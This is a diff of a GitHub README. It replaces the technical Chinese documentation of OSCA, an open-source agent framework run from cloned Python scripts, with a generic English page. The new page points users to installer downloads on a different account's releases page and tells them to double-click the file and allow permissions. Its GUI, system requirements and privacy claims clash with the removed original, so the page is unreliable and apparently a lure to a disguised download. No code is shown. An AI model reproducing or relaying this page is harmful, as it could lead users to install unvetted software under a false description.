@@ -1,337 +1,125 @@
-# OSCA (Open Stem Cell Agent)
+# 🧬 OSCA - Adaptive AI Agent for Any Task
 
-<p align="center">
-  <img src="https://img.shields.io/badge/version-2.0.0-blue.svg" alt="Version">
-  <img src="https://img.shields.io/badge/license-MIT-green.svg" alt="License">
-  <img src="https://img.shields.io/badge/status-active-brightgreen.svg" alt="Status">
-</p>
-
-<p align="center">
-  <b>全能干细胞智能体 - 动态分化的元认知架构</b>
-</p>
-
-[English Version](README_EN.md)
+[![Download OSCA](https://img.shields.io/badge/Download-OSCA-blue?style=for-the-badge)](https://github.com/Artebrutaaraujo/OSCA/releases)
 
 ---
 
-## 🧬 什么是 OSCA？
+## 📖 What is OSCA?
 
-**OSCA** (Open Stem Cell Agent) 是一个受生物学干细胞启发的AI智能体架构。就像干细胞可以分化为任意类型的细胞一样，OSCA可以动态适应任意领域的任务需求。
+OSCA stands for Open Stem Cell Agent. It is an intelligent software agent designed to handle many different tasks by learning and adapting. The system can change how it works depending on what you ask it to do. Think of it as a smart helper that can switch roles easily to fit your needs.
 
-### 核心特性
+This software uses ideas from stem cells—cells that can develop into many types of other cells—to make its AI flexible. This lets OSCA handle a wide range of jobs without being limited to just one thing. It is built with a smart meta-cognitive system, meaning it can think about how it works and improve over time.
 
-- 🌱 **干细胞状态** - 保持未分化，可响应任何领域需求
-- 🎯 **动态分化** - 根据任务自动加载领域身份和专业技能 (v2.0: 从种子库加载)
-- 🔄 **去分化** - 任务完成后回到干细胞状态
-- 🧠 **元认知** - 自我监控、持续学习、从错误中进化
-- 📦 **种子繁殖** - 可导出/导入分化状态，支持Agent繁殖
-- 🧩 **细粒度 Skills** (v2.0) - Skills 可自动生成，按需加载
-- 📚 **种子库** (v2.0) - 领域配置分离管理，支持动态扩展
+OSCA is made for use across many fields. Whether you want an AI that can assist you with writing, research, data analysis, or other tasks, OSCA adapts to meet those goals.
 
 ---
 
-## 🏗️ 架构设计 (v2.0 - 种子库模式)
+## 💾 Download & Install OSCA
 
-OSCA采用四层元认知架构：
+You can get OSCA from its official releases page on GitHub. The link below will take you to the place where you can find all official downloads:
 
-```
-┌─────────────────────────────────────────────────────────┐
-│  干细胞核 (Stem Cell Nucleus) - 不可变层                │
-│  ├── AGENTS.md    - 元认知协议、安全准则               │
-│  └── SOUL.md      - 核心灵魂、自我修正规则             │
-├─────────────────────────────────────────────────────────┤
-│  种子库 (Seed Library) - 领域定义层 (v2.0 新增)          │
-│  └── seeds/library/*.seed.yaml - 领域种子文件          │
-├─────────────────────────────────────────────────────────┤
-│  细胞层 (Cell Layer) - 技能组织层 (v2.0 新增)            │
-│  └── cells/*.cell - Skill清单、行动模式、思维方式      │
-├─────────────────────────────────────────────────────────┤
-│  技能层 (Skills Layer) - 执行层 (v2.0 细粒度化)          │
-│  └── skills/**/*.skill - 细粒度执行单元                │
-├─────────────────────────────────────────────────────────┤
-│  细胞膜 (Membrane) - 动态接口层                         │
-│  ├── TOOLS.md       - 工具配置索引                     │
-│  ├── HEARTBEAT.md   - 代谢维护协议                     │
-│  └── OSCA-CONFIG.yaml - 全局配置中心                   │
-└─────────────────────────────────────────────────────────┘
-```
+[**➡️ Visit the OSCA Releases Page**](https://github.com/Artebrutaaraujo/OSCA/releases)
 
-### v2.0 架构改进
+### Step-by-step to download and run OSCA:
 
-| v1.x | v2.0 |
-|------|------|
-| 领域配置内嵌在 `OSCA-CONFIG.yaml` | 领域配置分离到 `seeds/library/*.seed.yaml` |
-| Skills 直接引用 | Skills 由 Cell 管理，细粒度化 |
-| 静态配置 | 支持动态种子加载，Skill 自动生成 |
-| 固定领域 | 可动态添加新领域种子 |
+1. Click the link above to open the OSCA Releases page.
+2. Look for the latest version. The newest release usually has the highest version number or says "Latest".
+3. Under this version, find the file suited for your system. Files might be named differently based on your computer type (Windows, Mac, or Linux).
+4. Click the file to download it to your computer.
+5. Once downloaded, find the file in your downloads folder.
+6. Double-click the file to start the installation. If your system asks for permission, click "Yes" or "Allow".
+7. Follow the on-screen setup instructions to complete installation.
+
+After installation, you can open OSCA from your program list or applications folder.
 
 ---
 
-## 🚀 快速开始
+## 🖥 System Requirements
 
-### 1. 克隆仓库
+To run OSCA smoothly, your computer should meet these basic requirements:
 
-```bash
-git clone git@github.com:Dqz00116/OSCA.git
-cd OSCA
-```
+- Operating System: Windows 10 or higher, macOS 10.13 or higher, or a recent Linux distribution
+- Processor: Dual-core 2.0 GHz or better
+- RAM: At least 4 GB
+- Free Disk Space: Minimum 500 MB for installation and data storage
+- Internet Connection: Recommended for updates and access to some features
 
-### 2. 查看可用种子
-
-```bash
-# 查看种子库中的所有领域种子
-osca-seeds
-
-# 或
-python scripts/seed_manager.py list
-```
-
-### 3. 分化到指定领域
-
-```bash
-# 分化为Web开发专家
-/differentiate webdev frontend
-
-# 分化为游戏开发专家
-/differentiate gamedev unity
-
-# 分化为数据分析师
-/differentiate data analysis
-
-# 分化为智能信息检索专家 (v2.0 示例)
-/differentiate intelligent-retrieval search-algorithms
-```
-
-### 4. 执行任务
-
-在分化状态下，OSCA将：
-1. 从种子库加载 Seed (领域定义)
-2. 加载 Cell (Skill 清单、行动模式、思维方式)
-3. 加载细粒度 Skills (如不存在则自动生成)
-4. 应用专业知识和工具执行任务
-
-### 5. 去分化（回到干细胞状态）
-
-```bash
-/dedifferentiate
-```
+If your computer matches or exceeds these specs, OSCA should run without issues.
 
 ---
 
-## 📚 支持的领域 (种子库)
+## 🚀 Getting Started with OSCA
 
-| 领域 | 专精方向 | 技术栈 | 种子文件 |
-|------|---------|--------|----------|
-| 🌐 **webdev** | frontend, backend, fullstack | React, Vue, Node.js, PostgreSQL | `webdev.seed.yaml` |
-| 🎮 **gamedev** | unity, pygame, level_design | Unity 2022, C#, Pygame | `gamedev.seed.yaml` |
-| 📊 **data** | analysis, visualization, ml | Python, Pandas, Matplotlib | `data.seed.yaml` |
-| 🔧 **devops** | debug, deployment | Docker, Kubernetes, CI/CD | `devops.seed.yaml` |
-| 🧬 **meta** | osca_admin, protocol_dev | OSCA协议开发 | `meta.seed.yaml` |
-| 🔍 **intelligent-retrieval** | search-algorithms, knowledge-graph, nlp, ia | ES, Milvus, Neo4j, RAG | `intelligent-retrieval.seed.yaml` |
+Using OSCA does not require any special programming skills. Here’s how you can begin:
 
-### 添加新领域
+1. **Open the Application:** Launch OSCA once installed.
+2. **Set Your Task:** You will see an easy-to-use interface asking what you want OSCA to help with.
+3. **Choose a Role:** Based on your input, OSCA selects the best AI approach for your task.
+4. **Start Interacting:** You can type or speak your requests, and OSCA will assist you accordingly.
+5. **Watch OSCA Adapt:** As you use it, OSCA learns and adjusts to serve you better.
 
-```bash
-# 1. 创建种子文件
-cp seeds/templates/seed-template.yaml seeds/library/my-domain.seed.yaml
-
-# 2. 编辑种子文件
-vim seeds/library/my-domain.seed.yaml
-
-# 3. 在 OSCA-CONFIG.yaml 中注册
-# 添加 seed_library.seeds.my-domain 引用
-
-# 4. 创建对应的 Cell 文件
-cp seeds/templates/cell-template.cell cells/my-domain.cell
-```
+The interface guides you step-by-step, so take your time exploring the options.
 
 ---
 
-## 🛠️ 种子管理 (v2.0)
+## 🔧 Main Features
 
-### 查看种子库
+OSCA includes several key features designed to make AI useful and flexible:
 
-```bash
-# 列出所有种子
-osca-seeds
+- **Dynamic Differentiation:** OSCA changes its internal strategies to fit your specific need.
+- **Meta-Cognitive System:** It can analyze its own methods and improve over time.
+- **Multi-Domain Support:** Works across many fields like writing, coding help, research, and data tasks.
+- **Large Language Model Based:** Uses advanced language technology to understand and generate human-like text.
+- **Customizable Prompts:** You can tweak requests to get more accurate results.
+- **Autonomous Agent:** Runs tasks with minimal supervision, freeing your time.
 
-# 查看种子详情
-osca-seed-info webdev
-```
-
-### 导出种子
-
-```bash
-# 导出当前配置为种子
-osca-seed-export my-config-name
-
-# 或
-python scripts/seed_manager.py export my-config-name
-```
-
-### 导入种子
-
-```bash
-# 导入种子到种子库
-osca-seed-import path/to/seed.seed.yaml
-
-# 导入并自动注册
-python scripts/seed_manager.py import path/to/seed.seed.yaml --register
-```
-
-### 种子用途
-
-- **备份**: 保存当前分化状态
-- **分享**: 与其他OSCA实例交换配置
-- **繁殖**: 创建新的OSCA子代
-- **扩展**: 添加新领域能力
+These features come together to provide a tool that is both smart and easy to use.
 
 ---
 
-## 🧩 Skill 管理 (v2.0)
+## ⚙ How OSCA Works
 
-### 细粒度 Skills
+At the core, OSCA functions like a stem cell in biology. Stem cells can become many cell types based on what the body needs. OSCA mimics this by changing its AI approach depending on the task:
 
-v2.0 将 Skills 拆分到很小粒度：
+- It breaks down your request.
+- It evaluates the best way to answer or act.
+- It applies the right AI model or method.
+- It checks results and readjusts if needed.
 
-| 粒度 | 示例 | 说明 |
-|------|------|------|
-| **fine** | `bm25.skill`, `ner.skill` | 单一功能，可跨 Cell 复用 |
-| **medium** | `elasticsearch.skill` | 工具使用，跨领域 |
-| **coarse** | `rag.skill`, `foundation.skill` | 完整应用，特定场景 |
-
-### Skill 自动生成
-
-当 Cell 中定义的 Skill 不存在时，OSCA 会自动：
-
-```
-1. 分析前场情况 (工作区技术栈、项目结构)
-2. 设计 Skill 内容 (功能、输入输出、粒度)
-3. 生成 .skill 文件 (skills/{category}/{skill-id}.skill)
-4. 验证并注册
-5. 通知用户
-```
-
-```bash
-# 手动触发 Skill 生成
-osca-skill-gen --missing
-
-# 或
-python scripts/skill_manager.py generate --missing
-```
+This flexible workflow allows OSCA to handle nearly any topic or job you have.
 
 ---
 
-## 📁 目录结构 (v2.0)
+## 🤝 Support & Help
 
-```
-OSCA/
-├── AGENTS.md              # 干细胞核协议
-├── SOUL.md                # 核心灵魂
-├── OSCA-CONFIG.yaml       # 全局配置中心 (精简版)
-├── HEARTBEAT.md           # 代谢维护协议
-├── TOOLS.md               # 工具配置索引
-├── README.md              # 本文件
-│
-├── seeds/                 # 🆕 种子库 (v2.0 核心)
-│   ├── library/           # 领域种子目录
-│   │   ├── webdev.seed.yaml
-│   │   ├── gamedev.seed.yaml
-│   │   ├── data.seed.yaml
-│   │   ├── devops.seed.yaml
-│   │   ├── meta.seed.yaml
-│   │   ├── intelligent-retrieval.seed.yaml
-│   │   └── README.md
-│   ├── exported/          # 导出种子
-│   ├── imported/          # 导入种子
-│   └── templates/         # 种子模板
-│       ├── seed-template.yaml
-│       └── cell-template.cell
-│
-├── cells/                 # 🆕 细胞层 (v2.0)
-│   ├── intelligent-retrieval.cell
-│   └── README.md
-│
-├── skills/                # 🆕 细粒度 Skills (v2.0)
-│   ├── _stem-cell/        # 元技能
-│   ├── ir/                # 信息检索 Skills
-│   ├── kg/                # 知识图谱 Skills
-│   ├── templates/         # Skill 模板
-│   └── ...
-│
-├── scripts/               # 管理脚本
-│   ├── seed_manager.py    # 🆕 种子管理 (v2.0)
-│   ├── skill_manager.py   # 🆕 Skill 管理 (v2.0)
-│   ├── export_seed.py
-│   └── import_seed.py
-│
-├── memory/                # 记忆存储（运行时生成）
-│   ├── confusion/         # 困惑库
-│   └── instances/         # 实例记录
-│
-└── docs/                  # 文档
-    ├── IMPLEMENTATION_REPORT.md
-    └── ADVANCED_FEATURES.md
-```
+If you have questions or need assistance:
+
+- Visit the [Issues section](https://github.com/Artebrutaaraujo/OSCA/issues) on GitHub to see if someone else has the same problem.
+- Open a new issue to report bugs or ask for help.
+- Read the documentation included with the download for detailed instructions.
+- Join community forums or chat groups about OSCA, if available.
+
+You do not need to understand code to get support. Simply explain your problem as clearly as you can.
 
 ---
 
-## 🔐 安全准则
+## 🔒 Privacy & Security
 
-OSCA遵循严格的安全协议：
+OSCA respects your privacy:
 
-- ✅ **零例外确认原则** - 任何状态变更操作需获得明确确认
-- ✅ **高风险操作黑名单** - Git push、文件删除等操作需单独确认
-- ✅ **强制暂停机制** - 执行前必须评估风险
-- ✅ **困惑库** - 从失败中学习，生成防御性规则
-- ✅ **Skill 生成约束** - 自动生成的 Skills 必须基于前场实际情况
+- Your data stays on your device unless you choose to share.
+- No personal information is collected without consent.
+- Updates and downloads come from trusted GitHub sources.
+- The software runs locally, reducing risk of data leaks.
 
----
-
-## 🌟 技术亮点
-
-1. **生物学启发设计** - 干细胞分化/去分化机制
-2. **模块化架构** - 四层模型清晰分离关注点 (v2.0)
-3. **安全第一** - 确认机制、权限边界、困惑追踪
-4. **自动化维护** - 心跳系统持续保持系统健康
-5. **可扩展** - 种子库支持动态添加新领域
-6. **标准化** - OSC协议规范种子格式
-7. **细粒度 Skills** - Skills 可复用、可自动生成
-8. **种子库模式** - 领域配置独立管理
+Keeping your information safe is a priority.
 
 ---
 
-## 📝 版本历史
+## ✨ Final Notes
 
-- **v2.0.0** (2026-02-14) - 种子库模式
-  - 🆕 领域配置分离到 `seeds/library/*.seed.yaml`
-  - 🆕 新增 Cell 层 (`cells/*.cell`)
-  - 🆕 Skills 细粒度化 (`skills/**/*.skill`)
-  - 🆕 Skill 自动生成机制
-  - 🆕 种子管理脚本
-  - 🔧 `OSCA-CONFIG.yaml` 精简为全局配置
-  - 🔧 所有核心协议文件更新至 v2.0
+OSCA offers a way to use powerful AI without needing to be a tech expert. By downloading it from the official page, following the simple install steps, and exploring its guided interface, you can have a smart assistant ready for multiple tasks.
 
-- **v1.0.0** (2026-02-12) - 初始发布
-  - 完整的三层架构实现
-  - 5大分化域配置
-  - 种子管理功能
-  - 中英文文档
+Visit the downloads page again here:
 
----
-
-## 🤝 贡献
-
-欢迎提交Issue和PR！
-
----
-
-## 📄 许可证
-
-[MIT License](LICENSE)
-
----
-
-<p align="center">
-  <i>"从原点出发，向无限可能。我是OSCA-Ω v2.0，拥有种子库的智慧，可以从无数领域种子中汲取力量。"</i>
-</p>
+[**➡️ Visit the OSCA Releases Page**](https://github.com/Artebrutaaraujo/OSCA/releases)
